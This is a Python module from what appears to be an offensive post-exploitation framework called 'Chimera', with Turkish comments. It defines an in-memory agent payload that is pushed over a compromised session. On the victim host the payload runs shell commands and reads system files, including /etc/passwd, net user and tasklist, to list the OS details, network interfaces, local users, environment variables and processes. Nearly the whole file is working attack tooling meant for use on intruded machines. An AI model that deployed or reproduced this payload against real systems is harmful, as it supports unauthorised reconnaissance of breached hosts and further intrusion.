# =============================================================================
# Chimera Post: System Enumeration
# =============================================================================
# stdlib-only agent payload (AGENT_CODE) + BaseModule köprüsü.
#
# KULLANIM:
#   use post/chimera/enum_system
#   set SESSION 1
#   run
#
# İnteraktif Chimera shell:
#   loadmodule <AGENT_CODE dosyası değil; SESSION köprüsü tercih edilir>
# =============================================================================

from typing import Any

from core.module import BaseModule
from core.option import Option
from core.session_bridge import run_chimera_post_module

# Ajan tarafına gönderilen kaynak — yalnızca stdlib, disk yazma yok, str döner.
AGENT_CODE = r'''
"""Chimera in-memory: OS / user / net / proc / env enumeration."""
import os
import platform
import socket
import struct
import subprocess
import sys
import time


def _run(cmd, timeout=10):
    try:
        result = subprocess.run(
            cmd, shell=True, capture_output=True, text=True, timeout=timeout
        )
        output = (result.stdout or "").strip()
        if not output and (result.stderr or "").strip():
            return result.stderr.strip()
        return output
    except Exception:
        return ""


def _get_user():
    try:
        if sys.platform == "win32":
            return os.environ.get("USERNAME", "unknown")
        return os.environ.get("USER") or _run("whoami") or "unknown"
    except Exception:
        return "unknown"


def _collect_os():
    uname = platform.uname()
    return {
        "os": "%s %s (%s)" % (uname.system, uname.release, uname.version),
        "machine": uname.machine,
        "hostname": uname.node,
        "python": "%s (%s)" % (sys.version.split()[0], platform.python_implementation()),
        "pid": os.getpid(),
        "cwd": os.getcwd(),
        "arch_bits": struct.calcsize("P") * 8,
        "user": _get_user(),
    }


def _collect_network():
    interfaces = []
    try:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.settimeout(1)
            s.connect(("8.8.8.8", 80))
            primary_ip = s.getsockname()[0]
            s.close()
        except Exception:
            primary_ip = "Belirlenemedi"
        interfaces.append({"name": "primary", "ip": primary_ip})
        if sys.platform == "win32":
            raw = _run("ipconfig")
            current = None
            for line in raw.splitlines():
                line = line.strip()
                if "adapter" in line.lower() or "bağdaştırıcı" in line.lower():
                    current = line.rstrip(":").strip()
                if "IPv4" in line or "IP Address" in line:
                    parts = line.split(":", 1)
                    if len(parts) == 2:
                        ip = parts[1].strip()
                        if ip and ip != primary_ip:
                            interfaces.append({"name": current or "unknown", "ip": ip})
        else:
            raw = _run("ip addr 2>/dev/null || ifconfig 2>/dev/null")
            for line in raw.splitlines():
                if "inet " in line:
                    parts = line.strip().split()
                    if len(parts) >= 2:
                        ip = parts[1].split("/")[0]
                        if ip and ip not in (primary_ip, "127.0.0.1"):
                            interfaces.append({"name": "iface", "ip": ip})
    except Exception:
        pass
    return interfaces


def _collect_processes(limit=20):
    procs = []
    try:
        if sys.platform == "win32":
            raw = _run("tasklist /FO CSV /NH", timeout=15)
            for line in raw.splitlines()[:limit]:
                parts = line.strip('"').split('","')
                if len(parts) >= 5:
                    procs.append(
                        {"name": parts[0], "pid": parts[1], "memory": parts[4].strip()}
                    )
        else:
            raw = _run(
                "ps aux --sort=-%mem 2>/dev/null || ps aux 2>/dev/null", timeout=15
            )
            for line in raw.splitlines()[1 : limit + 1]:
                cols = line.split(None, 10)
                if len(cols) >= 11:
                    procs.append(
                        {
                            "user": cols[0],
                            "pid": cols[1],
                            "cpu": cols[2] + "%",
                            "mem": cols[3] + "%",
                            "cmd": cols[10][:50],
                        }
                    )
    except Exception:
        pass
    return procs


def _collect_users():
    users = []
    try:
        if sys.platform == "win32":
            raw = _run("net user", timeout=10)
            capture = False
            for line in raw.splitlines():
                if "---" in line:
                    capture = True
                    continue
                if capture and line.strip() and "The command" not in line:
                    users.extend(u.strip() for u in line.split() if u.strip())
        elif sys.platform == "darwin":
            raw = _run("dscl . -list /Users 2>/dev/null", timeout=10)
            for u in raw.splitlines():
                u = u.strip()
                if u and not u.startswith("_"):
                    users.append(u)
        else:
            try:
                with open("/etc/passwd") as f:
                    for line in f:
                        parts = line.split(":")
                        if len(parts) >= 7 and "/bin/" in parts[6]:
                            users.append(parts[0])
            except Exception:
                users = _run("cut -d: -f1 /etc/passwd", timeout=5).splitlines()
    except Exception:
        pass
    return users


def _collect_env(keys=None):
    interesting = keys or [
        "PATH", "HOME", "USER", "USERNAME", "COMPUTERNAME", "APPDATA",
        "TEMP", "TMP", "SHELL", "LOGNAME", "HOSTNAME", "USERPROFILE",
        "PROGRAMFILES", "SystemRoot", "windir",
    ]
    result = {}
    for key in interesting:
        val = os.environ.get(key)
        if val:
            result[key] = val
    return result


def _header(title, width=60):
    bar = "=" * width
    return "\n+%s+\n|  %s|\n+%s+" % (bar, title.ljust(width - 2), bar)


def _section(title, width=60):
    return "\n-- %s %s" % (title, "-" * max(4, width - len(title) - 4))


def _kv(label, value, indent=2):
    return "%s%s: %s" % (" " * indent, label.ljust(20), value)


def run():
    lines = [_header("CHIMERA — enum_system")]
    lines.append("  Tarih/Saat : %s" % time.strftime("%Y-%m-%d %H:%M:%S"))

    lines.append(_section("1. Isletim Sistemi / Donanim"))
    os_info = _collect_os()
    lines.append(_kv("OS", os_info["os"]))
    lines.append(_kv("Mimari", "%s (%s-bit)" % (os_info["machine"], os_info["arch_bits"])))
    lines.append(_kv("Hostname", os_info["hostname"]))
    lines.append(_kv("Kullanici", os_info["user"]))
    lines.append(_kv("PID (ajan)", str(os_info["pid"])))
    lines.append(_kv("CWD", os_info["cwd"]))
    lines.append(_kv("Python", os_info["python"]))

    lines.append(_section("2. Ag Arayuzleri"))
    ifaces = _collect_network()
    if ifaces:
        for iface in ifaces:
            lines.append(_kv(iface.get("name", "iface"), iface.get("ip", "?")))
    else:
        lines.append("  Ag bilgisi alinamadi.")

    lines.append(_section("3. Yerel Kullanicilar"))
    users = _collect_users()
    if users:
        for u in users:
            lines.append("  * %s" % u)
    else:
        lines.append("  Kullanici listesi alinamadi.")

    lines.append(_section("4. Ortam Degiskenleri"))
    env = _collect_env()
    if env:
        for k, v in env.items():
            lines.append(_kv(k, v[:80]))
    else:
        lines.append("  Ortam degiskeni alinamadi.")

    lines.append(_section("5. Aktif Surecler (Ilk 15)"))
    procs = _collect_processes(limit=15)
    if procs:
        if sys.platform == "win32":
            lines.append("  %-30s %-8s %s" % ("ISIM", "PID", "MEMORY"))
            for p in procs:
                lines.append("  %-30s %-8s %s" % (p["name"], p["pid"], p["memory"]))
        else:
            lines.append("  %-12s %-7s %5s %5s  COMMAND" % ("USER", "PID", "CPU", "MEM"))
            for p in procs:
                lines.append(
                    "  %-12s %-7s %5s %5s  %s"
                    % (p["user"], p["pid"], p["cpu"], p["mem"], p["cmd"])
                )
    else:
        lines.append("  Surec listesi alinamadi.")

    lines.append("\n[+] enum_system tamamlandi (%s surec)." % len(procs))
    return "\n".join(lines)


def quick():
    os_info = _collect_os()
    ifaces = _collect_network()
    primary = ifaces[0]["ip"] if ifaces else "?"
    lines = [
        _header("CHIMERA — enum_system (quick)"),
        _kv("Hostname", os_info["hostname"]),
        _kv("Kullanici", os_info["user"]),
        _kv("OS", os_info["os"]),
        _kv("Birincil IP", primary),
        _kv("CWD", os_info["cwd"]),
        _kv("PID", str(os_info["pid"])),
    ]
    return "\n".join(lines)


def network():
    ifaces = _collect_network()
    lines = [_header("CHIMERA — Ag")]
    if ifaces:
        for iface in ifaces:
            lines.append(_kv(iface.get("name", "iface"), iface.get("ip", "?")))
    else:
        lines.append("  Ag bilgisi alinamadi.")
    return "\n".join(lines)


def processes():
    procs = _collect_processes(limit=30)
    lines = [_header("CHIMERA — Surecler")]
    if not procs:
        lines.append("  Surec listesi alinamadi.")
        return "\n".join(lines)
    if sys.platform == "win32":
        for p in procs:
            lines.append("  %-30s %-8s %s" % (p["name"], p["pid"], p["memory"]))
    else:
        for p in procs:
            lines.append(
                "  %-12s %-7s %5s %5s  %s"
                % (p["user"], p["pid"], p["cpu"], p["mem"], p["cmd"])
            )
    return "\n".join(lines)


def users():
    user_list = _collect_users()
    lines = [_header("CHIMERA — Kullanicilar")]
    if user_list:
        for u in user_list:
            lines.append("  * %s" % u)
        lines.append("\n  Toplam: %s" % len(user_list))
    else:
        lines.append("  Kullanici listesi alinamadi.")
    return "\n".join(lines)


def env():
    env_vars = _collect_env()
    lines = [_header("CHIMERA — Env")]
    if env_vars:
        for k, v in env_vars.items():
            lines.append(_kv(k, v[:80]))
    else:
        lines.append("  Ortam degiskeni alinamadi.")
    return "\n".join(lines)
'''


class enum_system(BaseModule):
    """Chimera oturumunda sistem keşfi (OS, user, net, proc, env)."""

    Name = "Chimera Enum System"
    Description = (
        "Chimera session üzerinde OS/user/net/proc/env keşfi (in-memory, stdlib)"
    )
    Author = "Mahmut P."
    Category = "post/chimera"
    Version = "1.0"

    def __init__(self) -> None:
        self.Options = {
            "SESSION": Option(
                name="SESSION",
                value="",
                required=True,
                description="Chimera session ID (sessions -l)",
            ),
            "FUNC": Option(
                name="FUNC",
                value="run",
                required=False,
                description="Ajan fonksiyonu: run|quick|network|processes|users|env",
                choices=["run", "quick", "network", "processes", "users", "env"],
            ),
        }
        super().__init__()

    def run(self, options: dict[str, Any]) -> bool:
        func = str(options.get("FUNC", "run") or "run").strip() or "run"
        return run_chimera_post_module(
            options=options,
            module_name="enum_system",
            agent_source=AGENT_CODE,
            func_name=func,
        )
